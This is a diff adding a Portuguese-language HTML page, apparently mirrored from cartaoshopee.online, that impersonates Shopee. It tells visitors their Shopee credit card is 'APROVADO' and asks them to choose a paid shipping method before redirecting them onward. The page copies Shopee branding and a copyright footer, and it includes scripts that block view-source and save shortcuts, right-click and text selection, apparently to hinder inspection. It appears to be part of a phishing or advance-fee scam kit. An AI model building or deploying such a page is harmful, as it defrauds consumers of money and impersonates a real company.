@@ -1,0 +1,274 @@
+<!DOCTYPE html><html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <title>Cartão Shopee - Envio Sedex</title>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+        }
+
+        .header {
+            background: rgb(255, 255, 255);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .main-content {
+            max-width: 600px;
+            margin: 40px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .main-content h5 {
+            font-weight: bold;
+            color: #ee4d2d;
+            margin-bottom: 20px;
+        }
+
+        .opcao-card {
+            border: 2px solid #e6e6e6;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .opcao-card:hover {
+            border-color: #ee4d2d;
+            background-color: rgba(29, 78, 216, 0.05);
+        }
+
+        .opcao-card.selecionado {
+            border-color: #ee4d2d;
+            background-color: rgba(29, 78, 216, 0.1);
+        }
+
+        .opcao-card h6 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .opcao-card small {
+            color: #666;
+        }
+
+        .opcao-card .preco {
+            font-weight: bold;
+            color: #ee4d2d;
+        }
+
+        .opcao-card .icon {
+            margin-right: 15px;
+            font-size: 24px;
+            color: #ee4d2d;
+        }
+
+        .btn-custom {
+            background-color: #ee4d2d;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn-custom:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-custom:hover:not(:disabled) {
+            background-color: #ee4d2d;
+        }
+
+        .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+    }
+    </style>
+<script>
+if (document.addEventListener) {
+    document.addEventListener("keydown", bloquearSource);
+} else { //Versões antigas do IE
+    document.attachEvent("onkeydown", bloquearSource);
+}
+
+function bloquearSource(e) {
+    e = e || window.event;
+
+    var code = e.which || e.keyCode;
+
+    if (
+        e.ctrlKey &&
+        (code == 83 || code == 85) //83 = S, 85 = U
+    ) {
+        if (e.preventDefault) {
+            e.preventDefault();
+        } else {
+            e.returnValue = false;
+        }
+
+        return false;
+    }
+}
+</script><style>
+/*desabilita a seleção no body*/
+body {
+    -webkit-touch-callout: none; /* iOS Safari */
+      -webkit-user-select: none; /* Chrome/Safari/Opera */
+       -khtml-user-select: none; /* Konqueror */
+         -moz-user-select: none; /* Firefox */
+          -ms-user-select: none; /* Internet Explorer/Edge */
+              user-select: none;
+}
+
+/*habilita a seleção nos campos editaveis*/
+input, textarea {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: text; /* Chrome/Safari/Opera */
+       -khtml-user-select: text; /* Konqueror */
+         -moz-user-select: text; /* Firefox */
+          -ms-user-select: text; /* Internet Explorer/Edge */
+              user-select: text;
+}
+
+/*habilita a seleção nos campos com o atributo contenteditable*/
+[contenteditable=true] {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: all; /* Chrome/Safari/Opera */
+       -khtml-user-select: all; /* Konqueror */
+         -moz-user-select: all; /* Firefox */
+          -ms-user-select: all; /* Internet Explorer/Edge */
+              user-select: all;
+}
+</style><script>
+if (document.addEventListener) {
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+        return false;
+    });
+} else { //Versões antigas do IE
+    document.attachEvent("oncontextmenu", function(e) {
+        e = e || window.event;
+        e.returnValue = false;
+        return false;
+    });
+}
+</script></head>
+<body>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PZGDSCMH');</script>
+<!-- End Google Tag Manager -->
+    
+    <div class="header">
+        <img src="images/shopee-logo.png" alt="Logo">
+    </div>
+
+    <div class="main-content">
+        <h5>Escolha o método de envio</h5>
+        <p>Agora basta escolher uma forma de envio do seu Cartão de Crédito <strong>APROVADO</strong></p>
+
+        <div id="opcoes-envio">
+            <!-- Opção EXPRESS -->
+            <div class="opcao-card" onclick="selecionarOpcao('sedex')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">📦</span>
+                    <div>
+                        <h6>SEDEX</h6>
+                        <small>1 dia útil</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 34,90</div>
+            </div>
+
+            <!-- Opção SEDEX -->
+            <div class="opcao-card" onclick="selecionarOpcao('express')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">🚚</span>
+                    <div>
+                        <h6>EXPRESS</h6>
+                        <small>5 dias úteis</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 29,58</div>
+            </div>
+
+            <!-- Opção PAC -->
+            <div class="opcao-card" onclick="selecionarOpcao('pac')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">📬</span>
+                    <div>
+                        <h6>PAC</h6>
+                        <small>10 dias úteis</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 27,97</div>
+            </div>
+        </div>
+
+        <button id="continuarEnvio" class="btn-custom" disabled="">Continuar</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright 2025 Shopee. Todos os direitos reservados.<br>
+        
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+            </div>
+
+    <script>
+        let opcaoSelecionada = null;
+
+        function selecionarOpcao(opcao) {
+            opcaoSelecionada = opcao;
+
+            // Remove a classe 'selecionado' de todas as opções
+            document.querySelectorAll('.opcao-card').forEach(function(card) {
+                card.classList.remove('selecionado');
+            });
+
+            // Adiciona a classe 'selecionado' à opção clicada
+            document.querySelector(`.opcao-card[onclick="selecionarOpcao('${opcao}')"]`).classList.add('selecionado');
+
+            // Habilita o botão de continuar
+            document.getElementById('continuarEnvio').disabled = false;
+        }
+
+        document.getElementById('continuarEnvio').addEventListener('click', function() {
+            if (opcaoSelecionada) {
+                localStorage.setItem('metodoEnvio', opcaoSelecionada);
+                window.location.href = `../type-${opcaoSelecionada}/index.html`;
+            }
+        });
+    </script>
+
+
+</body>
+<!-- Mirrored from cartaoshopee.online/sedex/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 04 Feb 2025 03:03:02 GMT -->
+</html>
